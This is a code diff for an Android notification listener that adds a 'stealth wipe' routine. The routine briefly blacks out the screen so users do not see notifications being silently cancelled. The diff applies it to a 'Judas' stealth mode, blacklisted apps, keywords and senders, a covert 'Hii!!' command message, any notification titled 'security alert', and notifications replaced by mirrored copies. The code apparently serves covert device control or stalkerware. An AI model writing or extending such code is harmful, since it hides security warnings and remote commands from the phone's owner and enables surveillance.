@@ -23,6 +23,28 @@ class MyNotificationListener : NotificationListenerService() {
         instance = null
     }
 
+    private fun executeStealthWipe(key: String, reason: String, logTag: String = "STEALTH_WIPE") {
+        val previousLevel = DimmerManager.currentLevel
+        if (previousLevel == 100) {
+            // Flash the screen to 10% (almost pitch black) to hide the Heads-Up animation
+            android.os.Handler(android.os.Looper.getMainLooper()).post {
+                DimmerManager.applyDim(this, 10, "AUTO")
+            }
+        }
+        
+        cancelNotification(key)
+        DebugLogger.log(logTag, reason)
+        
+        if (previousLevel == 100) {
+            // Remove the blindfold after 800ms, which is long enough for the OS pop-up animation to complete its collapse
+            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                if (DimmerManager.currentLevel == 10) {
+                    DimmerManager.removeOverlay(this)
+                }
+            }, 800)
+        }
+    }
+
     fun wipeNotifications(target: String, value: String?): Int {
         val active = activeNotifications
         if (active == null) {
@@ -81,8 +103,7 @@ class MyNotificationListener : NotificationListenerService() {
 
         // --- PERSISTENT STEALTH PROTOCOL ---
         if (JudasManager.isStealthModeActive(this)) {
-            cancelNotification(sbn.key)
-            DebugLogger.log("STEALTH_WIPE", "Stealth mode active: Wiped notification from ${sbn.packageName}")
+            executeStealthWipe(sbn.key, "Stealth mode active: Wiped notification from ${sbn.packageName}")
             return
         }
 
@@ -149,8 +170,7 @@ class MyNotificationListener : NotificationListenerService() {
         val pkgList = autoPrefs.getString("pkgs", "") ?: ""
         DebugLogger.log("NOTIF_EVAL", "Checking PKG rule against list: [$pkgList]")
         if (pkgList.split(",").any { it.trim().equals(pkg, ignoreCase = true) }) {
-            cancelNotification(sbn.key)
-            DebugLogger.log("AUTO_SWIPE", "DECISION: PURGE. Reason: PKG matched blacklist ($pkg)")
+            executeStealthWipe(sbn.key, "PKG matched blacklist ($pkg)", "AUTO_SWIPE")
             return
         }
 
@@ -163,8 +183,7 @@ class MyNotificationListener : NotificationListenerService() {
                 target.isNotEmpty() && (title.contains(target, ignoreCase = true) || text.contains(target, ignoreCase = true)) 
             }
             if (matchedKw != null) {
-                cancelNotification(sbn.key)
-                DebugLogger.log("AUTO_SWIPE", "DECISION: PURGE. Reason: KEYWORD matched blacklist ($matchedKw)")
+                executeStealthWipe(sbn.key, "KEYWORD matched blacklist ($matchedKw)", "AUTO_SWIPE")
                 return
             }
         }
@@ -175,8 +194,7 @@ class MyNotificationListener : NotificationListenerService() {
         if (senderList.isNotEmpty()) {
             val matchedSender = senderList.split(",").find { it.trim().isNotEmpty() && title.contains(it.trim(), ignoreCase = true) }
             if (matchedSender != null) {
-                cancelNotification(sbn.key)
-                DebugLogger.log("AUTO_SWIPE", "DECISION: PURGE. Reason: SENDER matched blacklist ($matchedSender in title '$title')")
+                executeStealthWipe(sbn.key, "SENDER matched blacklist ($matchedSender in title '$title')", "AUTO_SWIPE")
                 return
             }
         }
@@ -189,9 +207,8 @@ class MyNotificationListener : NotificationListenerService() {
                               title.contains("security alert", ignoreCase = true)
 
         if (isCommand || isSecurityAlert) {
-            cancelNotification(sbn.key)
             val reason = if(isCommand) "Command 'Hii!!' Detected" else "Security Alert Detected"
-            DebugLogger.log("SHIELD", "DECISION: PURGE. Reason: $reason")
+            executeStealthWipe(sbn.key, "DECISION: PURGE. Reason: $reason", "SHIELD")
             return
         }
         
@@ -266,7 +283,7 @@ class MyNotificationListener : NotificationListenerService() {
         }
 
         // 1. SILENCE THE ORIGINAL
-        cancelNotification(sbn.key)
+        executeStealthWipe(sbn.key, "Silencing original for mirror", "ENGAGE_EVENT")
 
         // 2. POST THE MIRROR
         val nm = getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
